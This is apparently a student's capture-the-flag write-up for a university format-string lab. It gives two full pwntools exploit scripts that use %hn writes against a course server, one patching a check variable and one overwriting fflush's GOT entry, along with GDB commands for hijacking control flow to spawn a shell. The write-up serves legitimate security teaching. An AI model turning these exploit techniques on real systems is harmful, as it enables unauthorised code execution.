# WEEK 7 (Format Strings) - Challenge 3

## Introduction

In this challenge, we encountered a scenario similar to the one in task two, requiring a comparable attack. However, a notable obstacle arose: the target address ends with `\x20`, representing a space character. This posed a challenge as sending the address directly via the `scanf` function would be problematic.

To overcome this issue, we devised two effective workarounds and identified a third one that would be viable if the buffer size were larger.


## First way to solve

Our initial approach involved manipulating the original address, ending in `\x20`. We explored the neighboring addresses, specifically `address+1` and `address-1`. Instead of writing the usual 4 bytes using `%n`, we employed the `%hn` format to write the first 2 bytes (`be`) to `address+1`. Simultaneously, we crafted a write to `address-1` in a manner that caused an overflow, resulting in the original address being overwritten with the bytes `ef`.

To achieve this, we utilized the following script:


```python
from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4008)

# address  =  0x804b320
# Wanted value - 48879

N = 50
payload = bytearray(0x0 for i in range(N))
number = 0x0804b320+1
payload[0:4] = (number).to_bytes(4, byteorder='little')
number = 0x0804b320-1
payload[4:8] = (number).to_bytes(4, byteorder='little')

s = "%1$182x%hn"+ "%1$61000x%hn"
fmt = (s).encode('latin-1')
payload[8:8 + len(fmt)] = fmt


p.recvuntil(b"here...")
p.sendline(payload)
p.interactive()

```
The execution of the program provided us with a shell that allowed us to cat the flag.txt and therefore solve this challenge.

## Second way to solve

The second approach was notably more challenging than the previous one, but it proved to be highly effective. This method involves altering the program flow by modifying the address in the global offset table of the `fflush` function, thereby bypassing the `if` statement that checks if the variable is `0xbeef`. This manipulation grants us access to a shell program.

To confirm the viability of this technique, we initially executed it within GDB, as follows:


```bash
gdb attach PID
disassemble main
```
Get the address that we want the fflush to redirect to in our case it is 0x080492e0
<img src="/images/flow_redirect.png" alt="Address to redirect from gdb">

To redirect the actual function we need to do this sequence of commands in the gdb described bellow:
```bash
b main
run
disassemble main
disassemble 0x80490c0 (endereço antes do jump)
x 0x804b2fc (informação sobre a global offset table)
set *0x804b2fc = 0x080492e0 (ir direto para a linha que prepara a shell para ser lançada não pode se direto para a linha a da shell)
```

By implementing this change, we effectively alter the program's flow, creating a jump from the `fflush` after the `printf` to the system call responsible for spawning a shell. After executing the modified main function in GDB, we observe the following result:

![Shell Spawned in Another Process by Forking](/images/output_gdb_hard.png)

This output indicates that the program successfully forked using the system call and executed a shell. Armed with this understanding, we devised the script below:


```python
from pwn import *

LOCAL = False

if LOCAL:
    p = process("./program")
    pause()
else:    
    p = remote("ctf-fsi.fe.up.pt", 4008)

N = 50
payload = bytearray(0x0 for i in range(N))

number = 0x0804b2fc+2
payload[0:4] = (number).to_bytes(4, byteorder='little')

number = 0x0804b2fc
payload[4:8] = (number).to_bytes(4, byteorder='little')

s = "%1$2044x%hn" + "%1$35548x%hn"
fmt = (s).encode('latin-1')
payload[8:8 + len(fmt)] = fmt


p.recvuntil(b"here...")
p.sendline(payload)
p.interactive()
```

Due to the excessive size of the address, we had to resort once again to using `%hn`. To verify the correctness of our approach, we performed multiple GDB attaches, checking the address it now pointed to in the global offset table.

Through this process, we successfully discovered the flag by exploiting a shell spawn, effectively bypassing the `if` statement.

#### Font Used to Explore the Feasibility of This Attack: [LiveOverflow Explanation](https://www.youtube.com/watch?v=t1LH9D5cuK4)


## Third way that should be possible to solve

The first thing that actually came to our mind was to find a address ending in \x20 and modify just the start of it to the desired address but because we were limited in terms of the size of the buffer we ended up not being able to solve it like this.


